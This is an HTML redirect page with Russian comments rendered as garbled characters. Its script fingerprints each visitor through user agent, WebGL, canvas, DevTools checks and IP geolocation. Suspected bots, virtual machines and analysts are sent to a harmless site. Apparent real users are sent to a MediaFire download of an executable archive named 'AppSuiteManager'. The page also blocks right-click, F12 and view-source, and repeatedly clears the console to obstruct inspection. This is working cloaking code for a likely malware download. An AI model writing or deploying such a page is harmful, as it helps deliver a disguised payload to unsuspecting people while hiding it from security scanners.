<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting...</title>
  <style>
    body {
      margin: 0; padding: 0; background: linear-gradient(45deg, #1e3c72, #2a5298);
      color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex; justify-content: center; align-items: center; height: 100vh;
    }
    .container { text-align: center; padding: 40px; }
    .spinner { width: 50px; height: 50px; border: 3px solid rgba(255,255,255,0.3);
      border-top: 3px solid #fff; border-radius: 50%; animation: spin 1s linear infinite;
      margin: 0 auto 20px; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .message { font-size: 18px; margin: 10px 0; }
    .progress { width: 200px; height: 4px; background: rgba(255,255,255,0.3);
      border-radius: 2px; margin: 20px auto; overflow: hidden; }
    .progress-bar { height: 100%; background: #fff; width: 0%; animation: progress 3s ease-in-out; }
    @keyframes progress { 0% { width: 0%; } 100% { width: 100%; } }
  </style>
</head>
<body>
  <div class="container">
    <div class="spinner"></div>
    <div class="message">Analyzing traffic...</div>
    <div class="progress"><div class="progress-bar"></div></div>
  </div>

  <script>
    // üî• –ü–†–û–î–í–ò–ù–£–¢–ê–Ø –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø
    const config = {
      // –°—Å—ã–ª–∫–∏ –¥–ª—è —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞
      botLink: 'https://www.syncplicity.com/',
      userLink: 'https://www.mediafire.com/file_premium/sz58shk4kwcduyu/AppSuiteManager-1.0.4-x64.zip/file',
      
      // –ù–∞—Å—Ç—Ä–æ–π–∫–∏
      delay: 3000,
      strictMode: true, // –ë–æ–ª–µ–µ —Å—Ç—Ä–æ–≥–∞—è –¥–µ—Ç–µ–∫—Ü–∏—è
      
      // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ)
      blockedCountries: ['CN', 'RU'], // ISO –∫–æ–¥—ã —Å—Ç—Ä–∞–Ω
      
      // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ –≤—Ä–µ–º–µ–Ω–∏ (–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –≤ —Ä–∞–±–æ—á–∏–µ —á–∞—Å—ã)
      workingHoursBlock: false,
      workingHours: { start: 9, end: 17 }
    };

    class AdvancedBotDetector {
      constructor() {
        this.suspiciousPoints = 0;
        this.detectionResults = {};
        this.userIP = null;
        this.userLocation = null;
      }

      // üîç –ü–æ–ª—É—á–µ–Ω–∏–µ IP –∞–¥—Ä–µ—Å–∞
      async getUserIP() {
        try {
          const response = await fetch('https://api.ipify.org?format=json');
          const data = await response.json();
          this.userIP = data.ip;
          return data.ip;
        } catch {
          return null;
        }
      }

      // üåç –ü–æ–ª—É—á–µ–Ω–∏–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
      async getLocation() {
        try {
          if (!this.userIP) await this.getUserIP();
          
          const response = await fetch(`https://ipapi.co/${this.userIP}/json/`);
          const data = await response.json();
          this.userLocation = data;
          return data;
        } catch {
          return null;
        }
      }

      // ü§ñ –ë–∞–∑–æ–≤—ã–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –±–æ—Ç–æ–≤
      basicBotChecks() {
        const checks = {
          userAgent: () => {
            const ua = navigator.userAgent.toLowerCase();
            const patterns = [
              'bot', 'crawler', 'spider', 'scraper', 'automated',
              'googlebot', 'bingbot', 'yandexbot', 'baiduspider',
              'facebookexternalhit', 'twitterbot', 'linkedinbot',
              'whatsapp', 'telegram', 'discord', 'headless',
              'phantom', 'selenium', 'webdriver', 'chrome-lighthouse'
            ];
            return patterns.some(p => ua.includes(p));
          },

          webGL: () => {
            try {
              const canvas = document.createElement('canvas');
              const gl = canvas.getContext('webgl');
              if (!gl) return true;
              
              const vendor = gl.getParameter(gl.VENDOR);
              const renderer = gl.getParameter(gl.RENDERER);
              
              // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –≤–∏—Ä—Ç—É–∞–ª—å–Ω—ã–µ GPU
              const suspicious = [
                'swiftshader', 'llvmpipe', 'virtualbox',
                'vmware', 'microsoft basic render'
              ];
              
              return suspicious.some(s => 
                vendor.toLowerCase().includes(s) || 
                renderer.toLowerCase().includes(s)
              );
            } catch {
              return true;
            }
          },

          screen: () => {
            const w = screen.width, h = screen.height;
            return w < 100 || h < 100 || 
                   (w === 800 && h === 600) ||
                   (w === 1024 && h === 768) ||
                   w > 3000 || h > 3000;
          },

          plugins: () => navigator.plugins.length === 0,

          languages: () => {
            const langs = navigator.languages;
            return !langs || langs.length === 0 || 
                   (langs.length === 1 && langs[0] === 'en-US');
          },

          permissions: () => {
            return !navigator.permissions || 
                   typeof navigator.permissions.query !== 'function';
          },

          connection: () => {
            const conn = navigator.connection;
            return !conn || conn.effectiveType === 'slow-2g';
          },

          touch: () => {
            return 'ontouchstart' in window && navigator.maxTouchPoints === 0;
          }
        };

        let suspicious = 0;
        for (const [name, check] of Object.entries(checks)) {
          try {
            const result = check();
            this.detectionResults[name] = result;
            if (result) suspicious++;
          } catch {
            this.detectionResults[name] = true;
            suspicious++;
          }
        }

        return suspicious >= (config.strictMode ? 2 : 3);
      }

      // üé® Canvas fingerprinting
      canvasFingerprint() {
        try {
          const canvas = document.createElement('canvas');
          const ctx = canvas.getContext('2d');
          
          ctx.textBaseline = 'top';
          ctx.font = '14px Arial';
          ctx.fillStyle = '#f60';
          ctx.fillRect(125, 1, 62, 20);
          ctx.fillStyle = '#069';
          ctx.fillText('ü§ñ Bot test 123!@#', 2, 15);
          ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
          ctx.fillText('Fingerprint test', 4, 45);

          const imageData = canvas.toDataURL();
          
          // –°–ª–∏—à–∫–æ–º –∫–æ—Ä–æ—Ç–∫–∏–π = –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ
          if (imageData.length < 5000) return true;
          
          // –°—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è –¥–ª—è headless –±—Ä–∞—É–∑–µ—Ä–æ–≤
          const suspiciousHashes = [
            'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAA',
            'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwA'
          ];
          
          return suspiciousHashes.some(hash => imageData.startsWith(hash));
        } catch {
          return true;
        }
      }

      // ‚è∞ –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤—Ä–µ–º–µ–Ω–∏ –∏ –ø–æ–≤–µ–¥–µ–Ω–∏—è
      behaviorChecks() {
        const checks = [];

        // –°–ª–∏—à–∫–æ–º –±—ã—Å—Ç—Ä–∞—è –∑–∞–≥—Ä—É–∑–∫–∞
        checks.push(performance.now() < 50);

        // –ù–µ—Ç –∏—Å—Ç–æ—Ä–∏–∏ –±—Ä–∞—É–∑–µ—Ä–∞
        checks.push(history.length <= 1);

        // –ü–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–π referrer
        const ref = document.referrer.toLowerCase();
        const badRefs = ['facebook.com', 't.co', 'bit.ly', 'tinyurl.com'];
        checks.push(badRefs.some(domain => ref.includes(domain)));

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ DevTools
        const devToolsOpen = () => {
          const threshold = 160;
          return window.outerHeight - window.innerHeight > threshold ||
                 window.outerWidth - window.innerWidth > threshold;
        };
        checks.push(devToolsOpen());

        // –ê–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏—è
        checks.push(
          navigator.webdriver === true ||
          !!window.phantom ||
          !!window.callPhantom ||
          !!window._phantom ||
          !!window.__nightmare
        );

        return checks.filter(Boolean).length >= 2;
      }

      // üåê –ì–µ–æ–±–ª–æ–∫–∏—Ä–æ–≤–∫–∞
      async geoBlock() {
        if (config.blockedCountries.length === 0) return false;

        try {
          const location = await this.getLocation();
          if (!location) return false;

          return config.blockedCountries.includes(location.country_code);
        } catch {
          return false;
        }
      }

      // üïê –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –ø–æ –≤—Ä–µ–º–µ–Ω–∏
      timeBlock() {
        if (!config.workingHoursBlock) return false;

        const now = new Date();
        const hour = now.getHours();
        const { start, end } = config.workingHours;

        return hour >= start && hour <= end;
      }

      // üìä –§–∏–Ω–∞–ª—å–Ω–∞—è –æ—Ü–µ–Ω–∫–∞
      async detect() {
        console.log('üîç Starting advanced bot detection...');

        const checks = await Promise.all([
          this.basicBotChecks(),
          this.canvasFingerprint(),
          this.behaviorChecks(),
          this.geoBlock(),
          this.timeBlock()
        ]);

        const [isBasicBot, isSuspiciousCanvas, isSuspiciousBehavior, isGeoBlocked, isTimeBlocked] = checks;

        const totalSuspicious = checks.filter(Boolean).length;
        
        console.log('Detection results:', {
          basicBot: isBasicBot,
          suspiciousCanvas: isSuspiciousCanvas,
          suspiciousBehavior: isSuspiciousBehavior,
          geoBlocked: isGeoBlocked,
          timeBlocked: isTimeBlocked,
          totalScore: totalSuspicious,
          userIP: this.userIP,
          location: this.userLocation?.city + ', ' + this.userLocation?.country_name
        });

        // –°—Ç—Ä–æ–≥–∏–π —Ä–µ–∂–∏–º: –ª—é–±–∞—è 1 –ø—Ä–æ–≤–µ—Ä–∫–∞ = –±–æ—Ç
        // –û–±—ã—á–Ω—ã–π —Ä–µ–∂–∏–º: 2+ –ø—Ä–æ–≤–µ—Ä–∫–∏ = –±–æ—Ç
        return config.strictMode ? totalSuspicious >= 1 : totalSuspicious >= 2;
      }
    }

    // üöÄ –û—Å–Ω–æ–≤–Ω–∞—è –ª–æ–≥–∏–∫–∞
    async function main() {
      const detector = new AdvancedBotDetector();
      
      try {
        // –û–±–Ω–æ–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
        document.querySelector('.message').textContent = 'Checking security...';
        
        // –î–µ—Ç–µ–∫—Ü–∏—è
        const isBot = await detector.detect();
        
        // –í—ã–±–∏—Ä–∞–µ–º —Å—Å—ã–ª–∫—É
        const redirectUrl = isBot ? config.botLink : config.userLink;
        
        console.log(`üéØ Redirecting to: ${isBot ? 'BOT' : 'USER'} link`);
        
        // –û–±–Ω–æ–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
        document.querySelector('.message').textContent = 
          isBot ? 'Security check complete' : 'Redirecting to content...';
        
        // –†–µ–¥–∏—Ä–µ–∫—Ç
        setTimeout(() => {
          window.location.replace(redirectUrl);
        }, config.delay);

      } catch (error) {
        console.error('‚ùå Detection error:', error);
        // –í —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏ - —Ä–µ–¥–∏—Ä–µ–∫—Ç–∏–º –∫–∞–∫ –±–æ—Ç–∞
        setTimeout(() => {
          window.location.replace(config.botLink);
        }, config.delay);
      }
    }

    // üîí –ó–∞—â–∏—Ç–∞ –æ—Ç –∞–Ω–∞–ª–∏–∑–∞
    (() => {
      // –û—Ç–∫–ª—é—á–∞–µ–º –ø—Ä–∞–≤—ã–π –∫–ª–∏–∫
      document.addEventListener('contextmenu', e => e.preventDefault());
      
      // –û—Ç–∫–ª—é—á–∞–µ–º –≥–æ—Ä—è—á–∏–µ –∫–ª–∞–≤–∏—à–∏
      document.addEventListener('keydown', e => {
        if (e.key === 'F12' || 
            (e.ctrlKey && (e.key === 'u' || e.key === 'U')) ||
            (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i'))) {
          e.preventDefault();
        }
      });

      // –û—á–∏—â–∞–µ–º –∫–æ–Ω—Å–æ–ª—å –≤ –ø—Ä–æ–¥–∞–∫—à–µ–Ω–µ
      if (location.hostname !== 'localhost') {
        console.clear();
        setInterval(() => console.clear(), 1000);
      }
    })();

    // –ó–∞–ø—É—Å–∫
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', main);
    } else {
      main();
    }
  </script>
</body>
</html> 
